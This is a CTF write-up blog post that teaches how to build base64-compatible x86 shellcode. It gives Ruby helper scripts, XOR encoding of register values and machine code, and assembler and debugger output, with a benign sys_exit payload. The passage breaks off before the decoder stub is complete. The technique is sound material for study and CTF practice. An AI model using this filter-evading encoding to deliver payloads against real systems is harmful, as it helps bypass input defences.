---
id: 2307
title: 'Solving b-64-b-tuff: writing base64 and alphanumeric shellcode'
date: '2017-06-13T10:33:13-05:00'
author: ron
layout: post
guid: 'https://blog.skullsecurity.org/?p=2307'
permalink: /2017/solving-b-64-b-tuff-writing-base64-and-alphanumeric-shellcode
categories:
    - CTFs
    - Hacking
---

Hey everybody,

A couple months ago, we ran BSides San Francisco CTF. It was fun, and I posted blogs about it at the time, but I wanted to do a late writeup for the level <a href='https://github.com/BSidesSF/ctf-2017-release/tree/master/pwn/b-64-b-tuff'>b-64-b-tuff</a>.

The challenge was to write base64-compatible shellcode. There's an easy solution - using an alphanumeric encoder - but what's the fun in that? (also, I didn't think of it :) ). I'm going to cover base64, but these exact same principles apply to alphanumeric - there's absolutely on reason you couldn't change the <tt>SET</tt> variable in my examples and generate alphanumeric shellcode.

In this post, we're going to write a base64 decoder stub by hand, which encodes some super simple shellcode. I'll also post a link to a tool I wrote to automate this.

I can't promise that this is the best, or the easiest, or even a sane way to do this. I came up with this process all by myself, but I have to imagine that the generally available encoders do basically the same thing. :)
<!--more-->
<h2>Intro to Shellcode</h2>

I don't want to dwell too much on the basics, so I highly recommend reading <a href='https://github.com/iagox86/ctfworkshop-2017/blob/master/PRIMER.md'>PRIMER.md</a>, which is a primer on assembly code and shellcode that I recently wrote for a workshop I taught.

The idea behind the challenge is that you send the server arbitrary binary data. That data would be encoded into base64, then the base64 string was run as if it were machine code. That means that your machine code had to be made up of characters in the set <tt>[a-zA-Z0-9+/]</tt>. You could also have an equal sign ("=") or two on the end, but that's not really useful.

We're going to mostly focus on how to write base64-compatible shellcode, then bring it back to the challenge at the very end.

<h2>Assembly instructions</h2>

Since each assembly instruction has a 1:1 relationship to the machine code it generates, it'd be helpful to us to get a list of all instructions we have available that stay within the base64 character set.

To get an idea of which instructions are available, I wrote a quick Ruby script that would attempt to disassemble every possible combination of two characters followed by some static data.

I originally did this by scripting out to <tt>ndisasm</tt> on the commandline, a tool that we'll see used throughout this blog, but I didn't keep that code. Instead, I'm going to use the <a href='https://github.com/bnagy/crabstone'>Crabstone Disassembler</a>, which is Ruby bindings for Capstone:

<pre id='vimCodeElement'>
<span class="Include">require</span> <span class="rubyStringDelimiter">'</span><span class="String">crabstone</span><span class="rubyStringDelimiter">'</span>

<span class="Comment"># Our set of known characters</span>
<span class="rubyConstant">SET</span> = <span class="rubyStringDelimiter">'</span><span class="String">ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/</span><span class="rubyStringDelimiter">'</span>;

<span class="Comment"># Create an instance of the Crabstone Disassembler for 32-bit x86</span>
cs = <span class="rubyConstant">Crabstone</span>::<span class="rubyConstant">Disassembler</span>.new(<span class="rubyConstant">Crabstone</span>::<span class="rubyConstant">ARCH_X86</span>, <span class="rubyConstant">Crabstone</span>::<span class="rubyConstant">MODE_32</span>)

<span class="Comment"># Get every 2-character combination</span>
<span class="rubyConstant">SET</span>.chars.each <span class="Statement">do</span> |<span class="Identifier">c1</span>|
  <span class="rubyConstant">SET</span>.chars.each <span class="Statement">do</span> |<span class="Identifier">c2</span>|
    <span class="Comment"># Pad it out pretty far with obvious no-op-ish instructions</span>
    data = c1 + c2 + (<span class="rubyStringDelimiter">&quot;</span><span class="String">A</span><span class="rubyStringDelimiter">&quot;</span> * <span class="Number">14</span>)

    <span class="Comment"># Disassemble it and get the first instruction (we only care about the</span>
    <span class="Comment"># shortest instructions we can form)</span>
    instruction = cs.disasm(data, <span class="Number">0</span>)[<span class="Number">0</span>]

    puts <span class="rubyStringDelimiter">&quot;</span><span class="String">%s     %s %s</span><span class="rubyStringDelimiter">&quot;</span> % [
      instruction.bytes.map() { |<span class="Identifier">b</span>| <span class="rubyStringDelimiter">'</span><span class="String">%02x</span><span class="rubyStringDelimiter">'</span> % b }.join(<span class="rubyStringDelimiter">'</span><span class="String"> </span><span class="rubyStringDelimiter">'</span>),
      instruction.mnemonic.to_s,
      instruction.op_str.to_s
    ]
  <span class="Statement">end</span>
<span class="Statement">end</span>
</pre>

I'd probably do it considerably more tersely in <tt>irb</tt> if I was actually solving a challenge rather than writing a blog, but you get the idea. :)

Anyway, running that produces <a href='https://gist.github.com/iagox86/262d31185a4695f7255347fc75d000e0'>quite a lot of output</a>. We can feed it through <tt>sort</tt> + <tt>uniq</tt> to get <a href='https://gist.github.com/iagox86/b96e30393d60381e552718ab904a54ea'>a much shorter version</a>.

From there, I manually went through the full 2000+ element list to figure out what might actually be useful (since the vast majority were basically identical, that's easier than it sounds). I moved all the good stuff to the top and got rid of the stuff that's useless for writing a decoder stub. That left me with <a href='https://github.com/BSidesSF/ctf-2017-release/blob/master/pwn/b-64-b-tuff/solution/command_set.txt'>this list</a>. I left in a bunch of stuff (like multiply instructions) that probably wouldn't be useful, but that I didn't want to completely discount.

<h2>Dealing with a limited character set</h2>

When you write shellcode, there are a few things you have to do. At a minimum, you almost always have to change registers to fairly arbitrary values (like a command to execute, a file to read/write, etc) and make syscalls ("int 0x80" in assembly or "\xcd\x80" in machine code; we'll see how that winds up being the most problematic piece!).

For the purposes of this blog, we're going to have 12 bytes of shellcode: a simple call to the sys_exit() syscall, with a return code of 0x41414141. The reason is, it demonstrates all the fundamental concepts (setting variables and making syscalls), and is easy to verify as correct using <tt>strace</tt>

Here's the shellcode we're going to be working with:

<pre id='vimCodeElement'>
<span class="Identifier">mov</span> <span class="Identifier">eax</span>, <span class="Number">0x01</span> <span class="Comment">; Syscall 1 = sys_exit</span>
<span class="Identifier">mov</span> <span class="Identifier">ebx</span>, <span class="Number">0x41414141</span> <span class="Comment">; First (and only) parameter: the exit code</span>
<span class="Identifier">int</span> <span class="Number">0x80</span>
</pre>

We'll be using this code throughout, so make sure you have a pretty good grasp of it! It assembles to (on Ubuntu, if this fails, try <tt>apt-get install nasm</tt>):

<pre id='vimCodeElement'>
$ <span class="Statement">echo</span><span class="String"> -e </span><span class="Operator">'</span><span class="String">bits 32\n\nmov eax, 0x01\nmov ebx, 0x41414141\nint 0x80\n</span><span class="Operator">'</span><span class="String"> </span><span class="Operator">&gt;</span> file.asm; nasm <span class="Special">-o</span> file file.asm
$ hexdump <span class="Special">-C</span> file
<span class="Number">00000000</span>  b8 <span class="Number">01</span> <span class="Number">00</span> <span class="Number">00</span> <span class="Number">00</span> bb <span class="Number">41</span> <span class="Number">41</span>  <span class="Number">41</span> <span class="Number">41</span> <span class="Statement">cd</span> <span class="Number">80</span>              |............|
</pre>

If you want to try running it, you can use my <a href='https://github.com/BSidesSF/ctf-2017-release/tree/master/forensics/ximage/solution'>run_raw_code.c</a> utility (there are plenty just like it):

<pre id='vimCodeElement'>
$ strace ./run_raw_code file
<span class="Operator">[</span>...<span class="Operator">]</span>
<span class="Statement">read</span><span class="PreProc">(</span><span class="Number">3</span><span class="Special">, </span><span class="Operator">&quot;</span><span class="Special">\270</span><span class="Special">\1</span><span class="Special">\0\0\0\273</span><span class="String">AAAA</span><span class="Special">\315</span><span class="Special">\200</span><span class="Operator">&quot;</span><span class="Special">, </span><span class="Number">12</span><span class="PreProc">)</span> <span class="Operator">=</span> <span class="Number">12</span>
<span class="Statement">exit</span><span class="PreProc">(</span><span class="Number">1094795585</span><span class="PreProc">)</span>                        <span class="Operator">=</span> ?
</pre>

The read() call is where the run_raw_code stub is reading the shellcode file. The 1094795585 in exit() is the 0x41414141 that we gave it. We're going to see that value again and again and again, as we evaluate the correctness of our code, so get used to it!

You can also prove that it disassembles properly, and see what each line becomes using the <tt>ndisasm</tt> utility (this is part of the <tt>nasm</tt> package):

<pre id='vimCodeElement'>
$ <span class="Identifier">ndisasm</span> -<span class="Identifier">b32</span> <span class="Identifier">file</span>
<span class="Number">00000000</span>  <span class="Identifier">B801000000</span>        <span class="Identifier">mov</span> <span class="Identifier">eax</span>,<span class="Number">0x1</span>
<span class="Number">00000005</span>  <span class="Identifier">BB41414141</span>        <span class="Identifier">mov</span> <span class="Identifier">ebx</span>,<span class="Number">0x41414141</span>
<span class="Number">0000000</span><span class="Identifier">A</span>  <span class="Identifier">CD80</span>              <span class="Identifier">int</span> <span class="Number">0x80</span>
</pre>


<h2>Easy stuff: NUL byte restrictions</h2>

Let's take a quick look at a simple character restriction: NUL bytes. It's commonly seen because NUL bytes represent string terminators. Functions like strcpy() stop copying when they reach a NUL. Unlike base64, this can be done by hand!

It's usually pretty straight forward to get rid of NUL bytes by just looking at where they appear and fixing them; it's almost always the case that it's caused by 32-bit moves or values, so we can just switch to 8-bit moves (using <tt>eax</tt> is 32 bits; using <tt>al</tt>, the last byte of eax, is 8 bits):

<pre id='vimCodeElement'>
<span class="Identifier">xor</span> <span class="Identifier">eax</span>, <span class="Identifier">eax</span> <span class="Comment">; Set eax to 0</span>
<span class="Identifier">inc</span> <span class="Identifier">eax</span> <span class="Comment">; Increment eax (set it to 1) - could also use &quot;mov al, 1&quot;, but that's one byte longer</span>
<span class="Identifier">mov</span> <span class="Identifier">ebx</span>, <span class="Number">0x41414141</span> <span class="Comment">; Set ebx to the usual value, no NUL bytes here</span>
<span class="Identifier">int</span> <span class="Number">0x80</span> <span class="Comment">; Perform the syscall</span>
</pre>

We can prove this works, as well (I'm going to stop showing the <tt>echo</tt> as code gets more complex, but I use <tt>file.asm</tt> throughout):

<pre id='vimCodeElement'>
$ <span class="Statement">echo</span><span class="String"> -e </span><span class="Operator">'</span><span class="String">bits 32\n\nxor eax, eax\ninc eax\nmov ebx, 0x41414141\nint 0x80\n</span><span class="Operator">'</span><span class="Operator">&gt;</span> file.asm; nasm <span class="Special">-o</span> file file.asm
$ hexdump <span class="Special">-C</span> file
<span class="Number">00000000</span>  <span class="Number">31</span> c0 <span class="Number">40</span> bb <span class="Number">41</span> <span class="Number">41</span> <span class="Number">41</span> <span class="Number">41</span>  <span class="Statement">cd</span> <span class="Number">80</span>                    |<span class="Number">1</span>.@.AAAA..|
</pre>

Simple!

<h2>Clearing eax in base64</h2>

Something else to note: our shellcode is now largely base64! Let's look at the disassembled version so we can see where the problems are:

<pre id='vimCodeElement'>
$ <span class="Identifier">ndisasm</span> -<span class="Identifier">b32</span> <span class="Identifier">file</span>                               <span class="Number">65</span> [<span class="Number">11</span>:<span class="Number">16</span>:<span class="Number">34</span>]
<span class="Number">00000000</span>  <span class="Number">31</span><span class="Identifier">C0</span>              <span class="Identifier">xor</span> <span class="Identifier">eax</span>,<span class="Identifier">eax</span>
<span class="Number">00000002</span>  <span class="Number">40</span>                <span class="Identifier">inc</span> <span class="Identifier">eax</span>
<span class="Number">00000003</span>  <span class="Identifier">BB41414141</span>        <span class="Identifier">mov</span> <span class="Identifier">ebx</span>,<span class="Number">0x41414141</span>
<span class="Number">0000000</span><span class="Number">8</span>  <span class="Identifier">CD80</span>              <span class="Identifier">int</span> <span class="Number">0x80</span>
</pre>


Okay, maybe we aren't so close: the only line that's actually compatible is "inc eax". I guess we can start the long journey!

Let's start by looking at how we can clear eax using <a href='https://github.com/BSidesSF/ctf-2017-release/blob/master/pwn/b-64-b-tuff/solution/command_set.txt'>our instruction set</a>. We have a few promising instructions for changing eax, but these are the ones I like best:

<ul>
  <li>35 ?? ?? ?? ??        xor eax,0x????????</li>
  <li>68 ?? ?? ?? ??        push dword 0x????????</li>
  <li>58                pop eax</li>
</ul>

Let's start with the most naive approach:

<pre id='vimCodeElement'>
<span class="Identifier">push</span> <span class="Number">0</span>
<span class="Identifier">pop</span> <span class="Identifier">eax</span>
</pre>

If we assemble that, we get:

<pre id='vimCodeElement'>
<span class="Number">00000000</span>  <span class="Number">6</span><span class="Identifier">A00</span>              <span class="Identifier">push</span> <span class="Identifier">byte</span> +<span class="Number">0x0</span>
<span class="Number">00000002</span>  <span class="Number">58</span>                <span class="Identifier">pop</span> <span class="Identifier">eax</span>
</pre>


Close! But because we're pushing 0, we end up with a NUL byte. So let's push something else:

<pre id='vimCodeElement'>
<span class="Identifier">push</span> <span class="Number">0x41414141</span>
<span class="Identifier">pop</span> <span class="Identifier">eax</span>
</pre>

If we look at how that assembles, we get:

<pre id='vimCodeElement'>
<span class="Number">00000000</span>  <span class="Number">68</span> <span class="Number">41</span> <span class="Number">41</span> <span class="Number">41</span> <span class="Number">41</span> <span class="Number">58</span>                                 |hAAAAX|
</pre>

Not only is it all Base64 compatible now, it also spells <tt>"hAAAAX"</tt>, which is a fun coincidence. :)

The problem is, eax doesn't end up as 0, it's 0x41414141. You can verify this by adding "int 3" at the bottom, dumping a corefile, and loading it in gdb (feel free to use this trick throughout if you're following along, I'm using it constantly to verify my code snippings, but I'll only show it when the values are important):

<pre id='vimCodeElement'>
$ <span class="Statement">ulimit</span> <span class="Special">-c</span> unlimited
$ <span class="Statement">rm</span> core
$ cat file.asm
bits <span class="Number">32</span>

push 0x41414141
pop eax
int <span class="Number">3</span>
$ nasm <span class="Special">-o</span> file file.asm
$ ./run_raw_code ./file
allocated <span class="Number">8</span> bytes of executable memory at: 0x41410000
fish: “./run_raw_code ./file” terminated by signal SIGTRAP <span class="PreProc">(</span><span class="Special">Trace or breakpoint </span><span class="Statement">trap</span><span class="PreProc">)</span>
$ gdb ./run_raw_code ./core
Core was generated by <span class="Special">`./run_raw_code ./file`</span>.
Program terminated with signal SIGTRAP, Trace/breakpoint <span class="Statement">trap</span>.
<span class="Comment">#0  0x41410008 in ?? ()</span>
<span class="PreProc">(</span><span class="Special">gdb</span><span class="PreProc">)</span> <span class="Statement">print</span><span class="String">/x </span><span class="PreProc">$eax</span>
<span class="PreProc">$1</span> <span class="Operator">=</span> 0x41414141
</pre>

Anyway, if we don't like the value, we can xor a value with eax, provided that the value is also base64-compatible! So let's do that:

<pre id='vimCodeElement'>
<span class="Identifier">push</span> <span class="Number">0x41414141</span>
<span class="Identifier">pop</span> <span class="Identifier">eax</span>
<span class="Identifier">xor</span> <span class="Identifier">eax</span>, <span class="Number">0x41414141</span>
</pre>

Which assembles to:

<pre>00000000  68 41 41 41 41 58 35 41  41 41 41                 |hAAAAX5AAAA|</pre>


All right! You can verify using the debugger that, at the end, eax is, indeed, 0.

<h2>Encoding an arbitrary value in eax</h2>

If we can set eax to 0, does that mean we can set it to anything?

Since xor works at the byte level, the better question is: can you xor two base-64-compatible bytes together, and wind up with any byte?

Turns out, the answer is no. Not quite. Let's look at why!

We'll start by trying a pure bruteforce (this code is essentially from <a href='https://github.com/BSidesSF/ctf-2017-release/blob/master/pwn/b-64-b-tuff/solution/sploit.rb'>my solution</a>):

<pre id='vimCodeElement'>
SET = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
<span class="Statement">def</span> <span class="Function">find_bytes</span>(b)
  <span class="rubyConstant">SET</span>.bytes.each <span class="Statement">do</span> |<span class="Identifier">b1</span>|
    <span class="rubyConstant">SET</span>.bytes.each <span class="Statement">do</span> |<span class="Identifier">b2</span>|
      <span class="Statement">if</span>((b1 ^ b2) == b)
        <span class="Statement">return</span> [b1, b2]
      <span class="Statement">end</span>
    <span class="Statement">end</span>
  <span class="Statement">end</span>
  puts(<span class="rubyStringDelimiter">&quot;</span><span class="String">Error: Couldn't encode 0x%02x!</span><span class="rubyStringDelimiter">&quot;</span> % b)
  <span class="Statement">return</span> <span class="Constant">nil</span>
<span class="Statement">end</span>

<span class="Number">0</span>.upto(<span class="Number">255</span>) <span class="Statement">do</span> |<span class="Identifier">i</span>|
  puts(<span class="rubyStringDelimiter">&quot;</span><span class="String">%x =&gt; %s</span><span class="rubyStringDelimiter">&quot;</span> % [i, find_bytes(i)])
<span class="Statement">end</span>
</pre>

The full output is <a href='https://gist.github.com/iagox86/0e37a44b13007368d8027bfe7ab5ff32'>here</a>, but the summary is:

<pre id='vimCodeElement'>
<span class="Number">0</span> =&gt; [<span class="Number">65</span>, <span class="Number">65</span>]
<span class="Number">1</span> =&gt; [<span class="Number">66</span>, <span class="Number">67</span>]
<span class="Number">2</span> =&gt; [<span class="Number">65</span>, <span class="Number">67</span>]
<span class="Number">3</span> =&gt; [<span class="Number">65</span>, <span class="Number">66</span>]
...
7d =&gt; [<span class="Number">68</span>, <span class="Number">57</span>]
7e =&gt; [<span class="Number">70</span>, <span class="Number">56</span>]
7f =&gt; [<span class="Number">70</span>, <span class="Number">57</span>]
<span class="rubySymbol">Error</span>: <span class="rubyConstant">Couldn</span><span class="rubyStringDelimiter">'</span><span class="String">t encode 0x80!</span>
<span class="String">80 =&gt;</span>
<span class="String">Error: Couldn</span><span class="rubyStringDelimiter">'</span>t encode <span class="Number">0x81</span>!
<span class="Number">81</span> =&gt;
<span class="rubySymbol">Error</span>: <span class="rubyConstant">Couldn</span><span class="rubyStringDelimiter">'</span><span class="String">t encode 0x82!</span>
<span class="String">82 =&gt;</span>
<span class="String">...</span>
</pre>

Basically, we can encode any value that doesn't have the most-significant bit set (ie, anything under 0x80). That's going to be a problem that we'll deal with much, much later.

Since many of our instructions operate on 4-byte values, not 1-byte values, we want to operate in 4-byte chunks. Fortunately, xor is byte-by-byte, so we just need to treat it as four individual bytes:

<pre id='vimCodeElement'>
<span class="Statement">def</span> <span class="Function">get_xor_values_32</span>(desired)
  <span class="Comment"># Convert the integer into a string (pack()), then into the four bytes</span>
  b1, b2, b3, b4 = [desired].pack(<span class="rubyStringDelimiter">'</span><span class="String">N</span><span class="rubyStringDelimiter">'</span>).bytes()

  v1 = find_bytes(b1)
  v2 = find_bytes(b2)
  v3 = find_bytes(b3)
  v4 = find_bytes(b4)

  <span class="Comment"># Convert both sets of xor values back into integers</span>
  result = [
    [v1[<span class="Number">0</span>], v2[<span class="Number">0</span>], v3[<span class="Number">0</span>], v4[<span class="Number">0</span>]].pack(<span class="rubyStringDelimiter">'</span><span class="String">cccc</span><span class="rubyStringDelimiter">'</span>).unpack(<span class="rubyStringDelimiter">'</span><span class="String">N</span><span class="rubyStringDelimiter">'</span>).pop(),
    [v1[<span class="Number">1</span>], v2[<span class="Number">1</span>], v3[<span class="Number">1</span>], v4[<span class="Number">1</span>]].pack(<span class="rubyStringDelimiter">'</span><span class="String">cccc</span><span class="rubyStringDelimiter">'</span>).unpack(<span class="rubyStringDelimiter">'</span><span class="String">N</span><span class="rubyStringDelimiter">'</span>).pop(),
  ]


  <span class="Comment"># Note: I comment these out for many of the examples, simply for brevity</span>
  puts <span class="rubyStringDelimiter">'</span><span class="String">0x%08x</span><span class="rubyStringDelimiter">'</span> % result[<span class="Number">0</span>]
  puts <span class="rubyStringDelimiter">'</span><span class="String">0x%08x</span><span class="rubyStringDelimiter">'</span> % result[<span class="Number">1</span>]
  puts(<span class="rubyStringDelimiter">'</span><span class="String">----------</span><span class="rubyStringDelimiter">'</span>)
  puts(<span class="rubyStringDelimiter">'</span><span class="String">0x%08x</span><span class="rubyStringDelimiter">'</span> % (result[<span class="Number">0</span>] ^ result[<span class="Number">1</span>]))
  puts()

  <span class="Statement">return</span> result
<span class="Statement">end</span>
</pre>


This function takes a single 32-bit value and it outputs the two xor values (note that this won't work when the most significant bit is set.. stay tuned for that!):

<pre id='vimCodeElement'>
irb(main):039:<span class="Number">0</span>&gt; get_xor_values_32(<span class="Number">0x01020304</span>)
<span class="Number">0x42414141</span>
<span class="Number">0x43434245</span>
----------
<span class="Number">0x01020304</span>

=&gt; [<span class="Number">1111572801</span>, <span class="Number">1128481349</span>]

irb(main):<span class="Number">040</span>:<span class="Number">0</span>&gt; get_xor_values_32(<span class="Number">0x41414141</span>)
<span class="Number">0x6a6a6a6a</span>
<span class="Number">0x2b2b2b2b</span>
----------
<span class="Number">0x41414141</span>

=&gt; [<span class="Number">1785358954</span>, <span class="Number">724249387</span>]
</pre>

And so on.

So if we want to set eax to 0x00000001 (for the sys_exit syscall), we can simply feed it into this code and convert it to assembly:

<pre id='vimCodeElement'>
get_xor_values_32(<span class="Number">0x01</span>)
<span class="Number">0x41414142</span>
<span class="Number">0x41414143</span>
----------
<span class="Number">0x00000001</span>

=&gt; [<span class="Number">1094795586</span>, <span class="Number">1094795587</span>]
</pre>


Then write the shellcode:

<pre id='vimCodeElement'>
<span class="Identifier">push</span> <span class="Number">0x41414142</span>
<span class="Identifier">pop</span> <span class="Identifier">eax</span>
<span class="Identifier">xor</span> <span class="Identifier">eax</span>, <span class="Number">0x41414143</span>
</pre>

And prove to ourselves that it's base-64-compatible; I believe in doing this, because every once in awhile an instruction like "inc eax" (which becomes '@') will slip in when I'm not paying attention:

<pre id='vimCodeElement'>
$ hexdump <span class="Special">-C</span> file
<span class="Number">00000000</span>  <span class="Number">68</span> <span class="Number">42</span> <span class="Number">41</span> <span class="Number">41</span> <span class="Number">41</span> <span class="Number">58</span> <span class="Number">35</span> <span class="Number">43</span>  <span class="Number">41</span> <span class="Number">41</span> <span class="Number">41</span>                 |hBAAAX5CAAA|
</pre>

We'll be using that exact pattern <em>a lot</em> - push (value) / pop eax / xor eax, (other value). It's the most fundamental building block of this project!

<h2>Setting other registers</h2>

Sadly, unless I missed something, there's no easy way to set other registers. We can increment or decrement them, and we can pop values off the stack into some of them, but we don't have the ability to xor, mov, or anything else useful!

There are basically three registers that we have easy access to:

<ul>
<li>58                pop eax</li>
<li>59                pop ecx</li>
<li>5A                pop edx</li>
</ul>

So to set ecx to an arbitrary value, we can do it via eax:

<pre id='vimCodeElement'>
<span class="Identifier">push</span> <span class="Number">0x41414142</span>
<span class="Identifier">pop</span> <span class="Identifier">eax</span>
<span class="Identifier">xor</span> <span class="Identifier">eax</span>, <span class="Number">0x41414143</span> <span class="Comment">; eax -&gt; 1</span>
<span class="Identifier">push</span> <span class="Identifier">eax</span>
<span class="Identifier">pop</span> <span class="Identifier">ecx</span> <span class="Comment">; ecx -&gt; 1</span>
</pre>

Then verify the base64-ness:

<pre id='vimCodeElement'>
$ hexdump <span class="Special">-C</span> file
<span class="Number">00000000</span>  <span class="Number">68</span> <span class="Number">42</span> <span class="Number">41</span> <span class="Number">41</span> <span class="Number">41</span> <span class="Number">58</span> <span class="Number">35</span> <span class="Number">43</span>  <span class="Number">41</span> <span class="Number">41</span> <span class="Number">41</span> <span class="Number">50</span> <span class="Number">59</span>           |hBAAAX5CAAAPY|
</pre>

Unfortunately, if we try the same thing with ebx, we hit a non-base64 character:

<pre id='vimCodeElement'>
$ hexdump <span class="Special">-C</span> file
<span class="Number">00000000</span>  <span class="Number">68</span> <span class="Number">42</span> <span class="Number">41</span> <span class="Number">41</span> <span class="Number">41</span> <span class="Number">58</span> <span class="Number">35</span> <span class="Number">43</span>  <span class="Number">41</span> <span class="Number">41</span> <span class="Number">41</span> <span class="Number">50</span> 5b           |hBAAAX5CAAAP<span class="Operator">[</span><span class="Operator">|</span>
</pre>

Note the "[" at the end - that's not in our character set! So we're pretty much limited to using eax, ecx, and edx for most things.

But wait, there's more! We do, however, have access to popad. The popad instruction pops the next 8 things off the stack and puts them in all 8 registers. It's a bit of a scorched-earth method, though, because it overwrites <em>all</em> registers. We're going to use it at the start of our code to zero-out all the registers.

Let's try to convert our exit shellcode from earlier:

<pre id='vimCodeElement'>
<span class="Identifier">mov</span> <span class="Identifier">eax</span>, <span class="Number">0x01</span> <span class="Comment">; Syscall 1 = sys_exit</span>
<span class="Identifier">mov</span> <span class="Identifier">ebx</span>, <span class="Number">0x41414141</span> <span class="Comment">; First (and only) parameter: the exit code</span>
<span class="Identifier">int</span> <span class="Number">0x80</span>
</pre>

Into something that's base-64 friendly:

<pre id='vimCodeElement'>
<span class="Comment">; We'll start by populating the stack with 0x41414141's</span>
<span class="Identifier">push</span> <span class="Number">0x41414141</span>
<span class="Identifier">push</span> <span class="Number">0x41414141</span>
<span class="Identifier">push</span> <span class="Number">0x41414141</span>
<span class="Identifier">push</span> <span class="Number">0x41414141</span>
<span class="Identifier">push</span> <span class="Number">0x41414141</span>
<span class="Identifier">push</span> <span class="Number">0x41414141</span>
<span class="Identifier">push</span> <span class="Number">0x41414141</span>
<span class="Identifier">push</span> <span class="Number">0x41414141</span>

<span class="Comment">; Then popad to set all the registers to 0x41414141</span>
<span class="Identifier">popad</span>

<span class="Comment">; Then set eax to 1</span>
<span class="Identifier">push</span> <span class="Number">0x41414142</span>
<span class="Identifier">pop</span> <span class="Identifier">eax</span>
<span class="Identifier">xor</span> <span class="Identifier">eax</span>, <span class="Number">0x41414143</span>

<span class="Comment">; Finally, do our syscall (as usual, we're going to ignore the fact that the syscall isn't base64 compatible)</span>
<span class="Identifier">int</span> <span class="Number">0x80</span>
</pre>

Prove that it uses only base64 characters (except the syscall):

<pre id='vimCodeElement'>
$ hexdump <span class="Special">-C</span> file
<span class="Number">00000000</span>  <span class="Number">68</span> <span class="Number">41</span> <span class="Number">41</span> <span class="Number">41</span> <span class="Number">41</span> <span class="Number">68</span> <span class="Number">41</span> <span class="Number">41</span>  <span class="Number">41</span> <span class="Number">41</span> <span class="Number">68</span> <span class="Number">41</span> <span class="Number">41</span> <span class="Number">41</span> <span class="Number">41</span> <span class="Number">68</span>  |hAAAAhAAAAhAAAAh|
<span class="Number">00000010</span>  <span class="Number">41</span> <span class="Number">41</span> <span class="Number">41</span> <span class="Number">41</span> <span class="Number">68</span> <span class="Number">41</span> <span class="Number">41</span> <span class="Number">41</span>  <span class="Number">41</span> <span class="Number">68</span> <span class="Number">41</span> <span class="Number">41</span> <span class="Number">41</span> <span class="Number">41</span> <span class="Number">68</span> <span class="Number">41</span>  |AAAAhAAAAhAAAAhA|
<span class="Number">00000020</span>  <span class="Number">41</span> <span class="Number">41</span> <span class="Number">41</span> <span class="Number">68</span> <span class="Number">41</span> <span class="Number">41</span> <span class="Number">41</span> <span class="Number">41</span>  <span class="Number">61</span> <span class="Number">68</span> <span class="Number">42</span> <span class="Number">41</span> <span class="Number">41</span> <span class="Number">41</span> <span class="Number">58</span> <span class="Number">35</span>  |AAAhAAAAahBAAAX5|
<span class="Number">00000030</span>  <span class="Number">43</span> <span class="Number">41</span> <span class="Number">41</span> <span class="Number">41</span> <span class="Statement">cd</span> <span class="Number">80</span>                                 |CAAA..|
</pre>


And prove that it still works:

<pre id='vimCodeElement'>
$ strace ./run_raw_code ./file
...
<span class="Statement">read</span><span class="PreProc">(</span><span class="Number">3</span><span class="Special">, </span><span class="Operator">&quot;</span><span class="String">hAAAAhAAAAhAAAAhAAAAhAAAAhAAAAhA</span><span class="Operator">&quot;</span><span class="Special">..., </span><span class="Number">54</span><span class="PreProc">)</span> <span class="Operator">=</span> <span class="Number">54</span>
<span class="Statement">exit</span><span class="PreProc">(</span><span class="Number">1094795585</span><span class="PreProc">)</span>                        <span class="Operator">=</span> ?
</pre>

<h2>Encoding the actual code</h2>

You've probably noticed by now: this is <em>a lot</em> of work. Especially if you want to set each register to a different non-base64-compatible value! You have to encode each value by hand, making sure you set eax last (because it's our working register). And what if you need an instruction (like add, or shift) that isn't available? Do we just simulate it?

As I'm sure you've noticed, the machine code is just a bunch of bytes. What's stopping us from simply encoding the machine code rather than just values?

Let's take our original example of an exit again:

<pre id='vimCodeElement'>
<span class="Identifier">mov</span> <span class="Identifier">eax</span>, <span class="Number">0x01</span> <span class="Comment">; Syscall 1 = sys_exit</span>
<span class="Identifier">mov</span> <span class="Identifier">ebx</span>, <span class="Number">0x41414141</span> <span class="Comment">; First (and only) parameter: the exit code</span>
<span class="Identifier">int</span> <span class="Number">0x80</span>
</pre>

Because 'mov' assembles to 0xb8XXXXXX, I don't want to deal with that yet (the most-significant bit is set). So let's change it a bit to keep each byte (besides the syscall) under 0x80:
<pre id='vimCodeElement'>
<span class="Number">00000000</span>  <span class="Number">6</span><span class="Identifier">A01</span>              <span class="Identifier">push</span> <span class="Identifier">byte</span> +<span class="Number">0x1</span>
<span class="Number">00000002</span>  <span class="Number">58</span>                <span class="Identifier">pop</span> <span class="Identifier">eax</span>
<span class="Number">00000003</span>  <span class="Number">6841414141</span>        <span class="Identifier">push</span> <span class="Identifier">dword</span> <span class="Number">0x41414141</span>
<span class="Number">0000000</span><span class="Number">8</span>  <span class="Number">5</span><span class="Identifier">B</span>                <span class="Identifier">pop</span> <span class="Identifier">ebx</span>
</pre>

Or, as a string of bytes:

<pre>"\x6a\x01\x58\x68\x41\x41\x41\x41\x5b"</pre>

Let's pad that to a multiple of 4 so we can encode in 4-byte chunks (we pad with 'A', because it's as good a character as any):

<pre>"\x6a\x01\x58\x68\x41\x41\x41\x41\x5b\x41\x41\x41"</pre>

then break that string into 4-byte chunks, encoding as little endian (reverse byte order):

<ul>
<li>6a 01 58 68 -&gt; 0x6858016a</li>
<li>41 41 41 41 -&gt; 0x41414141</li>
<li>5b 41 41 41 -&gt; 0x4141415b</li>
</ul>

Then run each of those values through our get_xor_values_32() function from earlier:

<pre id='vimCodeElement'>
irb(main):<span class="Number">047</span>:<span class="Number">0</span>&gt; puts <span class="rubyStringDelimiter">'</span><span class="String">0x%08x ^ 0x%08x</span><span class="rubyStringDelimiter">'</span> % get_xor_values_32(<span class="Number">0x6858016a</span>)
<span class="Number">0x43614241</span> ^ <span class="Number">0x2b39432b</span>

irb(main):048:<span class="Number">0</span>&gt; puts <span class="rubyStringDelimiter">'</span><span class="String">0x%08x ^ 0x%08x</span><span class="rubyStringDelimiter">'</span> % get_xor_values_32(<span class="Number">0x41414141</span>)
<span class="Number">0x6a6a6a6a</span> ^ <span class="Number">0x2b2b2b2b</span>

irb(main):<span class="Number">050</span>:<span class="Number">0</span>&gt; puts <span class="rubyStringDelimiter">'</span><span class="String">0x%08x ^ 0x%08x</span><span class="rubyStringDelimiter">'</span> % get_xor_values_32(<span class="Number">0x4141415b</span>)
<span class="Number">0x6a6a6a62</span> ^ <span class="Number">0x2b2b2b39</span>
</pre>

